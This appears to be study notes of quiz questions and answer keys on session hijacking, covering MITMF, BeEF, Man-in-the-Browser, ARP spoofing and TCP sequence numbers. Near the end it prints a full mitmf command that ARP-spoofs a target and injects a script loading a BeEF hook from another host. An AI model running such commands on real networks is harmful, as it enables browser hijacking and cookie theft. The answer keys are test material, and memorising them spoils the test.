            During the penetration test, 
            Marin is using the "MITMF" tool to 
            
            inject the arbitrary data 
                   into an HTTP communication channel 
                          between the clients on the internal network and web servers 

             in order to 
                    - steal the cookies
                    - establish a remote shell on the victim’s computer.

            He successfully injects XSS JavaScript 
                        into the session, 

            Using "BeeF",  he has a 
                        control over the "user browser".

            Command used with the MITMF tool:

            There is no 0-day vulnerability against the client browser (at least not the one Marin knows about).

Is it possible to gain the remote shell access to the remote machine without
browser/javascript/flash etc. vulnerability?



      TRUE :
      Yes. Marin can try to use social engineering attacks (like “Fake Flash Update”), 
            and try to fool the user into clicking on the malicious payload


Explanation:
The correct answer is
    “Yes. Marin can try to use social engineering attacks (like “Fake Flash Update”), 
      
            and try to fool the user into clicking on the malicious payload”.

    If the user is naïve enough, Marin can always make him click on malicious payload with social engineering payloads in BeeF.
    There is no magical exploit that always works even if there is no 0-day.

------------------------------------

MitB (Man in the Browser) is a session hijacking technique heavily used by e-banking Trojans. 
The most popular ones are 
      - Zeus 
      - Gameover Zeus. 
 
 Explain how MitB attack works.




          TRUE  : 
          
          Malware is injected between the
                              
                              browser     
                           &      
                              OS API,
          
          enabling to see the data  :
                        
                  - Before encryption 
                        (when data is sent from the machine) 
              & 
                  - After decryption 
                        (when data is being received by the machine).


          Explanation:
          
          On Windows OS, 
            
            malware is injected between 
            
                  the browser 
                 & 
                  wininet.dll,  ( wininet.dll is exposing APIs to use https etc.)
           
           which allows it to see the data before encryption 

-------------------------------------

In order to hijack TCP traffic, 

      an attacker has to understand 
      
            - the next SEQ sequence number 
            &
            - the ACK acknowledge number 
  
that the remote computer expects. 

Explain how the SEQ and aCK numbers are incremented during the 3-way handshake process.



        TRUE :
        
        Sequence and acknowledgment numbers are incremented by 1 during the 3-way handshake process


        Explanation:
        
        During the 3-way handshake, SEQ and ACK numbers are (relatively) incremented by 1.
        
            After that ACK number will be incremented for the size of the packet received.

----------------------------------------

Which of the following is considered to be a session hijacking attack?


Taking over a TCP session : 
      
            TRUE

Monitoring a TCP session

Monitoring a UDP session

Taking over a UDP session


---------------------------------

When a person (or software) 

      steals, can calculate, or can guess 
            
            part of the communication channel 
      
      between client &  server application or protocols used in the communication, he can hijack the ______.


TCP protocol

UDP protocol

Session : TRUE

Channel

----------------------------------

An attacker is using session hijacking on the victim system 
      
            to perform further exploitation on the target network. 
            
 Identify the type of attacks an attacker can perform using session hijacking?


Sniffing  : TRUE

Dumpster Diving

Tailgating

Piggybacking


--------------------------------

During a penetration test, Marin identified a web application that
      
      could be exploited to gain a 
            
            root shell on the remote machine.

The only problem was that in order to do that 

      he would have to know at least 
      
            one valid username & password that could be used in the application.
  
Unfortunately, guessing usernames and brute-forcing passwords did not work.

Marin does not want to give up his attempts.

Since this web application is being used by almost all users in the company, 
            
            and moreover it was using the "http protocol", 
                  
                  so he decided to use the "Cain&Abel tool" 
                        
                        in order to identify at least 1 username & password.

Morin found that the network was using "layer 2 switches "
            
                  with no configuration or management features.
                  
What could be the easiest way to start an attack in this case?



        ARP spoofing

        MitB (Man in the Browser)

        MitM (Man in the Middle) : TRUE

        DNS spoofing


---------------------------------------------------------------------------------------------------------------

During the penetration testing, 
      
      Marin identified a web application that could be exploited to
            
                  gain the root shell on the remote machine. 
                  
      The only problem was that in order to do that he would have to 
      
            know at least 1 username and password usable in the application. 
            
      Unfortunately, guessing usernames and brute-forcing passwords did not work. 
            
       Marin does not want to give up his attempts. 
       
       Since this web application,
       
            was being used by almost all users in the company and was using "http protocol", 
                  
                  so he decided to use "Cain & Abel tool" 
                        
                        in order to identify at least 1 username and password.

After a few minutes, the first username & password popped-up 
      
            and he successfully exploited the web application and the physical machine.

 What type of attack did he use in order to find the username and password to access the web application?



            DNS spoofing

            ARP spoofing : TRUE

            TCP protocol hijacking

            UDP protocol hijacking

Explanation:

ARP spoofing is the correct answer, and

    since there are 
      
        "no configuration or management options"  on switches
    
          => it means that there is
          
                        "no ARP spoofing protection".

 DNS spoofing is more complex and it is never the first option.

 TCP and UDP protocol hijacking does not make any sense here – after ARP spoofing all the traffic will be hijacked.

--------------------------------

During a penetration test, 
      
      Marin exploited a blind SQLi 
            
            and exfiltrated session tokens
     
     from the database. 
     
     What can he do with this data?




      Marin can do XSS (Cross-Site Scripting)

      Marin can do Session hijacking : TRUE

      Marin can do SQLi (SQL injection)

      Marin can do CSRF (Cross-Site Request Forgery)

----------------------------------------------------------------------------


During the penetration test, 
      
      Marin is using the "MITMF tool" to inject the arbitrary data 
            
               into an HTTP communication channel between the clients on the internal network and web servers 
            
         in order to steal the cookies and, 
         if possible, establish a remote shell on the victim’s computer.

      He successfully injects XSS JavaScript into the session, 
      and with BeeF he has a control over the user browser, 

Command used with the MITMF tool:

mitmf -i eth0 --spoof --arp --gateway 192.168.132.2 --targets 192.168.132.196 --inject
--js-payload  "</script><script src="http://192.168.132.120:3000/hook.js></script>"



There is no 0-day vulnerability against the client browser (at least not the one Marin knows about). 
Is it possible to gain the remote shell access to the remote machine without browser/javascript/flash etc. vulnerability?


                                   Yes. Marin can try to use social engineering attacks (like “Fake Flash Update”), and try to fool the user into clicking on the malicious payload : TRUE



-----------------------------
